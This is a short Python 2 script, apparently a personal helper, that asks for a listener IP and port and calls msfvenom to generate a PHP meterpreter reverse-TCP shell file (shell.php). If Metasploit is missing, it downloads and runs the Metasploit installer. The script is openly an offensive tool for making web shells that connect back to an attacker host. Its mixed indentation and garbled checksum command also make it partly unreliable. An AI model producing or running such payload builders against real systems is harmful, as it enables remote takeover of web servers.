import os, sh, time, subprocess

user = os.getenv("SUDO_USER")
if user is None:
    print("\n   Execute as \033[1;31;48msudo\033[1;37;48m\n")
    exit()

rc = subprocess.call(['which', 'msfconsole'])
if rc == 0:
	os.system('reset')
	lhost = raw_input("Host IP/Domain: ")
	lport = 0

	def lportvalid(lport):
	    if lport >=0:
	        return True
	    return False

	while True:
	    try:
		lport = int(raw_input("Host Port: "))
	        if lportvalid(lport): break
	    except ValueError:
	        print "Invalid Port!"
	str(lport)
	defaultlocation = "~/Documents/"
	print("Building PHP file...")

#	YESSSSSSSSSSSSSSSSSSSSSSSSSSSSS	
	os.system('msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw >shell.php'.format(lhost, lport))

	print("Done!")

else:
    print 'Installing Metasploit!\nRun the Metasploit setup when prompted!'
    os.system('wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run && wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run.sha1 && echo $(cat metasploit-latest-linux-x64-installer.run.sha1)'  'metasploit-latest-linux-x64-installer.run > metasploit-latest-linux-x64-installer.run.sha1 && shasum -c metasploit-latest-linux-x64-installer.run.sha1 && chmod +x ./metasploit-latest-linux-x64-installer.run')
    print 'Please complete the metasploit installer!'
    os.system('sudo ./metasploit-latest-linux-x64-installer.run')